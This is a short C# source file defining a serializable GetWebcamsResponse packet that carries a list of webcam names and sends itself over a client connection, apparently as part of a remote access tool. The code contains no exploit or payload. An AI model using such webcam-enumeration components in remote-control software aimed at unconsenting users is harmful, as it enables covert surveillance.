using System;
using System.Collections.Generic;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetWebcamsResponse : IPacket
    {
        public List<string>  Names { get; set; }

        public GetWebcamsResponse()
        {
        }

        public GetWebcamsResponse(List<string> names)
        {
            this.Names = names;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}